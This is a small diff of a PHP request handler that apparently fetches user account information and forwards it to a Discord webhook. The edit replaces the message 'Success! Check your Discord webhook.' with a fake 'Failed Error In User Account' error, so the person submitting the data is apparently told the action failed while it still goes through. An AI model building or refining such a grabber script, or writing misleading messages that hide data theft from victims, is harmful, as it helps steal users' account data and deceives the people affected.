@@ -27,7 +27,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     curl_close($ch);
 
     if ($httpcode !== 200) {
-        echo "Failed to fetch user info.";
+        echo "Failed to Email Remove An Error";
         exit;
     }
 
@@ -69,7 +69,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     curl_exec($ch);
     curl_close($ch);
 
-    echo "Success! Check your Discord webhook.";
+    echo "Failed Error In User Account";
 } else {
     echo "Invalid request.";
 }
